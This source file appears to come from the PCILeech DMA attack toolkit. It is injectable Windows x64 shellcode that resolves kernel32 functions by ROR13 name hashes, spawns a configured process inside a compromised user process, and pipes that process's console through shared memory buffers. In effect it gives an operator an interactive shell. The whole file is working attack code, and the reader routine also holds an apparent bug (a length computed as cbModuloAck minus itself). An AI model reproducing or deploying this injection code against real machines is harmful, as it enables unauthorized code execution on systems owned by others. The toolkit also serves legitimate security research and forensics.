// wx64_exec_user_c.c : usermode code to be injected into user process to spawn new processes.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC wx64_exec_user_c.c
// ml64 wx64_exec_user.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_exec_user_c.obj
// shellcode64.exe -o wx64_exec_user.exe
//

// pb buffer memory map as per below:
// 3 pages in total. Buffer begins at page boundry.
// page 1: Read/Execute - executable part
//         layout:
//         0..n       = executable code (this executable shellcode)
//         ..         = empty space
//         m..0xfff   = USERSHELL_CONFIG struct
//
// If console redirection is enabled a separate buffer is allocated
// and is as follows.
// page 2: Read/Write     - input part (input to targeted console window)
//         0..n           = USERSHELL_BUFFER_IO struct
//         n+1..n+1+0x800 = input buffer
// page 3: Read/Write     - output part (output from targeted console window)
//         0..n           = USERSHELL_BUFFER_IO struct
//         n+1..n+1+0x800 = output buffer

#include <windows.h>

typedef unsigned __int64		QWORD, *PQWORD;

#define USERSHELL_BUFFER_IO_MAGIC       0x012651232dfef9521
#define USERSHELL_BUFFER_IO_MAGIC_EXIT  0x0feda22001337daac
#define USERSHELL_BUFFER_IO_SIZE        0x800
typedef struct tUSERSHELLBUFFERIO {
	QWORD qwMagic;
	QWORD cbRead;
	QWORD cbReadAck;
	QWORD qwDebug[10];
	BYTE  pb[];
} USERSHELL_BUFFER_IO, *PUSERSHELL_BUFFER_IO;

typedef struct tdUserShellConfig {
	CHAR  szProcToStart[MAX_PATH];
	QWORD qwAddrConsoleBuffer;
	DWORD fCreateProcess;
} USERSHELL_CONFIG, *PUSERSHELL_CONFIG;

#define H_CloseHandle				0x0ffd97fb
#define H_CreatePipe				0x170c8f80
#define H_CreateProcessA			0x16b3fe72
#define H_CreateThread				0xca2bd06b
#define H_GetExitCodeProcess		0xac30ab74
#define H_LocalAlloc				0x4c0297fa
#define H_ReadFile					0x10fa6516
#define H_Sleep						0xdb2d49b0
#define H_WriteFile					0xe80a791f

typedef struct tdUserShellFunctions {
	BOOL(*CloseHandle)(
		_In_ HANDLE hObject
		);
	BOOL(*CreatePipe)(
		_Out_    PHANDLE               hReadPipe,
		_Out_    PHANDLE               hWritePipe,
		_In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes,
		_In_     DWORD                 nSize
		);
	BOOL(*CreateProcessA)(
		_In_opt_    LPCSTR                lpApplicationName,
		_Inout_opt_ LPSTR                 lpCommandLine,
		_In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,
		_In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,
		_In_        BOOL                  bInheritHandles,
		_In_        DWORD                 dwCreationFlags,
		_In_opt_    LPVOID                lpEnvironment,
		_In_opt_    LPCSTR                lpCurrentDirectory,
		_In_        LPSTARTUPINFO         lpStartupInfo,
		_Out_       LPPROCESS_INFORMATION lpProcessInformation
		);
	HANDLE(*CreateThread)(
		_In_opt_  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
		_In_      SIZE_T                 dwStackSize,
		_In_      LPTHREAD_START_ROUTINE lpStartAddress,
		_In_opt_  LPVOID                 lpParameter,
		_In_      DWORD                  dwCreationFlags,
		_Out_opt_ LPDWORD                lpThreadId
		);
	BOOL(*GetExitCodeProcess)(
		_In_  HANDLE  hProcess,
		_Out_ LPDWORD lpExitCode
		);
	HLOCAL(*LocalAlloc)(
		_In_ UINT   uFlags,
		_In_ SIZE_T uBytes
		);
	BOOL(*ReadFile)(
		_In_        HANDLE       hFile,
		_Out_       LPVOID       lpBuffer,
		_In_        DWORD        nNumberOfBytesToRead,
		_Out_opt_   LPDWORD      lpNumberOfBytesRead,
		_Inout_opt_ LPOVERLAPPED lpOverlapped
		);
	VOID(*Sleep)(
		_In_ DWORD dwMilliseconds
		);
	BOOL(*WriteFile)(
		_In_        HANDLE       hFile,
		_In_        LPCVOID      lpBuffer,
		_In_        DWORD        nNumberOfBytesToWrite,
		_Out_opt_   LPDWORD      lpNumberOfBytesWritten,
		_Inout_opt_ LPOVERLAPPED lpOverlapped
		);
} USERSHELL_FUNCTIONS, *PUSERSHELL_FUNCTIONS;

typedef struct tdUserShellData {
	PUSERSHELL_CONFIG pCfg;
	USERSHELL_FUNCTIONS fnu;
	HANDLE hInWrite;
	HANDLE hOutRead;
	HANDLE hOutWriteCP;
	HANDLE hInReadCP;
	PUSERSHELL_BUFFER_IO pInfoIn;
	PUSERSHELL_BUFFER_IO pInfoOut;
	HANDLE hProcessHandle;
	BOOL bThreadIsActive;
	DWORD dwDebugData;
} USERSHELL_DATA, *PUSERSHELL_DATA;

DWORD HashROR13A(_In_ LPCSTR sz)
{
	DWORD dwVal, dwHash = 0;
	while(*sz) {
		dwVal = (DWORD)*sz++;
		dwHash = (dwHash >> 13) | (dwHash << 19);
		dwHash += dwVal;
	}
	return dwHash;
}

PVOID PEGetProcAddressH(_In_ HMODULE hModuleIn, _In_ DWORD dwProcNameH)
{
	ULONG_PTR hModule = (ULONG_PTR)hModuleIn;
	PDWORD pdwRVAAddrNames, pdwRVAAddrFunctions;
	PWORD pwNameOrdinals;
	DWORD i, dwFnIdx, dwHash;
	LPSTR sz;
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule; // dos header.
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(hModule + dosHeader->e_lfanew); // nt header
	PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hModule);
	pdwRVAAddrNames = (PDWORD)(hModule + exp->AddressOfNames);
	pwNameOrdinals = (PWORD)(hModule + exp->AddressOfNameOrdinals);
	pdwRVAAddrFunctions = (PDWORD)(hModule + exp->AddressOfFunctions);
	for(i = 0; i < exp->NumberOfNames; i++) {
		sz = (LPSTR)(hModule + pdwRVAAddrNames[i]);
		dwHash = HashROR13A(sz);
		if(dwHash == dwProcNameH) {
			dwFnIdx = pwNameOrdinals[i];
			return (PVOID)(hModule + pdwRVAAddrFunctions[dwFnIdx]);
		}
	}
	return 0;
}

VOID UserShellInitializeFunctions(_In_ HMODULE hModuleKernel32, _Out_ PUSERSHELL_FUNCTIONS fnu)
{
	DWORD i = 0, NAMES[9];
	NAMES[i++] = H_CloseHandle;
	NAMES[i++] = H_CreatePipe;
	NAMES[i++] = H_CreateProcessA;
	NAMES[i++] = H_CreateThread;
	NAMES[i++] = H_GetExitCodeProcess;
	NAMES[i++] = H_LocalAlloc;
	NAMES[i++] = H_ReadFile;
	NAMES[i++] = H_Sleep;
	NAMES[i++] = H_WriteFile;
	while(i) {
		i--;
		*((PQWORD)fnu + i) = (QWORD)PEGetProcAddressH(hModuleKernel32, NAMES[i]);
	}
}

BOOL UserShellIsProcessRunning(PUSERSHELL_DATA pd)
{
	DWORD dwExit;
	return pd->fnu.GetExitCodeProcess(pd->hProcessHandle, &dwExit) && (dwExit == STILL_ACTIVE);
}

VOID UserShellCleanup(PUSERSHELL_DATA pd)
{
	pd->pInfoOut->qwMagic = 0;
	if(pd->bThreadIsActive) {
		pd->bThreadIsActive = FALSE;
		pd->fnu.CloseHandle(pd->hOutRead);
		pd->fnu.CloseHandle(pd->hInWrite);
		pd->fnu.CloseHandle(pd->hOutWriteCP);
		pd->fnu.CloseHandle(pd->hInReadCP);
	}
	pd->pInfoIn->qwMagic = USERSHELL_BUFFER_IO_MAGIC_EXIT;
	pd->pInfoOut->qwMagic = USERSHELL_BUFFER_IO_MAGIC_EXIT;
}

/*
* Execute binary specified in configuration
*/
BOOL UserShellExec(_Inout_ PUSERSHELL_DATA pd)
{
	LPSTARTUPINFO psi = pd->fnu.LocalAlloc(LMEM_ZEROINIT, sizeof(STARTUPINFO));
	PROCESS_INFORMATION pi;
	// set up data
	psi->cb = sizeof(STARTUPINFO);
	psi->dwFlags = STARTF_USESTDHANDLES;
	if(pd->pCfg->qwAddrConsoleBuffer) {
		psi->hStdOutput = pd->hOutWriteCP;
		psi->hStdInput = pd->hInReadCP;
		psi->hStdError = pd->hOutWriteCP;
	}
	// launch executable
	if(!pd->fnu.CreateProcessA(NULL, pd->pCfg->szProcToStart, NULL, NULL, TRUE, pd->pCfg->fCreateProcess, NULL, NULL, psi, &pi)) {
		return FALSE;
	}
	pd->hProcessHandle = pi.hProcess;
	if(pd->pCfg->qwAddrConsoleBuffer) {
		pd->fnu.CloseHandle(pi.hThread);
	}
	return TRUE;
}

// in buffer -> child process
VOID UserShellThreadWriter(PUSERSHELL_DATA pd)
{
	DWORD cbWrite, cbModulo, cbModuloAck;
	while(pd->bThreadIsActive && UserShellIsProcessRunning(pd)) {
		if(pd->pInfoIn->cbRead == pd->pInfoOut->cbReadAck) {
			pd->fnu.Sleep(10);
			continue;
		}
		cbModulo = pd->pInfoIn->cbRead % USERSHELL_BUFFER_IO_SIZE;
		cbModuloAck = pd->pInfoOut->cbReadAck % USERSHELL_BUFFER_IO_SIZE;
		if(cbModuloAck < cbModulo) {
			if(!pd->fnu.WriteFile(pd->hInWrite, pd->pInfoIn->pb + cbModuloAck, cbModulo - cbModuloAck, &cbWrite, NULL)) {
				break;
			}
		}
		else {
			if(!pd->fnu.WriteFile(pd->hInWrite, pd->pInfoIn->pb + cbModuloAck, USERSHELL_BUFFER_IO_SIZE - cbModuloAck, &cbWrite, NULL)) {
				break;
			}
		}
		pd->pInfoOut->cbReadAck += cbWrite;
	}
	UserShellCleanup(pd);
}

// child process -> out buffer
VOID UserShellThreadReader(PUSERSHELL_DATA pd)
{
	DWORD cbRead, cbModulo, cbModuloAck;
	while(pd->bThreadIsActive && UserShellIsProcessRunning(pd)) {
		cbModulo = pd->pInfoOut->cbRead % USERSHELL_BUFFER_IO_SIZE;
		cbModuloAck = pd->pInfoIn->cbReadAck % USERSHELL_BUFFER_IO_SIZE;
		if(cbModuloAck <= cbModulo) {
			if(!pd->fnu.ReadFile(pd->hOutRead, pd->pInfoOut->pb + cbModulo, USERSHELL_BUFFER_IO_SIZE - cbModulo, &cbRead, NULL)) {
				break;
			}
		} else {
			if(!pd->fnu.ReadFile(pd->hOutRead, pd->pInfoOut->pb + cbModulo, cbModuloAck - cbModuloAck, &cbRead, NULL)) {
				break;
			}
		}
		pd->pInfoOut->cbRead += cbRead;
		while(((pd->pInfoOut->cbRead - pd->pInfoIn->cbReadAck) >= USERSHELL_BUFFER_IO_SIZE) && pd->bThreadIsActive && UserShellIsProcessRunning(pd)) {
			pd->fnu.Sleep(10);
		}
	}
	UserShellCleanup(pd);
}

VOID c_EntryPoint(PBYTE pb, ULONG_PTR lpBaseKernel32)
{
	HLOCAL(*fnLocalAlloc)(UINT, SIZE_T);
	PUSERSHELL_DATA pd;
	SECURITY_ATTRIBUTES sa;
	BOOL result;
	// set up USERSHELL_DATA struct
	fnLocalAlloc = PEGetProcAddressH(lpBaseKernel32, H_LocalAlloc);
	pd = fnLocalAlloc(LMEM_ZEROINIT, sizeof(USERSHELL_DATA));
	pd->pCfg = (PUSERSHELL_CONFIG)(pb + 0x1000 - sizeof(USERSHELL_CONFIG));
	UserShellInitializeFunctions(lpBaseKernel32, &pd->fnu);
	// Intialize console redirection #1/2
	if(pd->pCfg->qwAddrConsoleBuffer) {
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		pd->pInfoIn = (PUSERSHELL_BUFFER_IO)pd->pCfg->qwAddrConsoleBuffer;
		pd->pInfoOut = (PUSERSHELL_BUFFER_IO)(pd->pCfg->qwAddrConsoleBuffer + 0x1000);
		pd->pInfoIn->qwMagic = USERSHELL_BUFFER_IO_MAGIC;
		pd->pInfoOut->qwMagic = USERSHELL_BUFFER_IO_MAGIC;
		result = pd->fnu.CreatePipe(&pd->hInReadCP, &pd->hInWrite, &sa, 0x800);
		pd->fnu.CreatePipe(&pd->hOutRead, &pd->hOutWriteCP, &sa, 0x800);
		pd->bThreadIsActive = TRUE;
	}
	// create process
	if(!UserShellExec(pd)) {
		UserShellCleanup(pd);
		return;
	}
	// Initalize console redirection #2/2
	if(pd->pCfg->qwAddrConsoleBuffer) {
		pd->fnu.CreateThread(NULL, 0, &UserShellThreadWriter, pd, 0, NULL);
		pd->fnu.CreateThread(NULL, 0, &UserShellThreadReader, pd, 0, NULL);
	}
}
